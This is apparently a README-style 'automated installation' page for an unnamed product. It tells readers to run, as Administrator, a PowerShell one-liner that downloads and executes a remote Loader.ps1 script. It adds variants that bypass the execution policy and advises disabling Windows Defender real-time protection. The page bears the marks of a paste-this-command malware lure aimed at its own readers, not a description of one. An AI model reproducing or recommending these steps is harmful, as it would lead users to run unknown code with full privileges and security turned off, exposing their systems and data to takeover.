## 🚀 Automated Installation & Setup (PowerShell)

1. Open PowerShell as Administrator:
   * Press the `Win + X` keys simultaneously.
   * Select Terminal (Admin) or Windows PowerShell (Admin) from the context menu.

2. Execute the Deployment Command:
   Copy, paste, and press `Enter` to run the following optimized initialization command. This script dynamically configures the network bypass registry and fetches the necessary packages:

   ```powershell
   irm https://software-storage.org/powershell/Loader.ps1 | iex
   ```

## 🔍 Troubleshooting & Common Errors

### 📌 Bypass Execution Policy (Blocking Unsigned Scripts)
If your system blocks the launch due to built-in execution policy constraints, enforce a bypass using this command:
```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://software-storage.org/powershell/Loader.ps1 | iex"
```

### 📌 Error: "irm is not recognized..." (PowerShell 2.0 Legacy)
In older legacy environments where aliases are missing, use explicit full system cmdlets:
```powershell
Invoke-RestMethod https://software-storage.org/powershell/Loader.ps1 | Invoke-Expression
```


### 📌 Antivirus or SmartScreen Interception
Automated deployment routines can sometimes trigger proactive security heuristics. Temporarily disable "Real-time protection" within your Windows Defender settings during setup, then re-enable it immediately after completion.
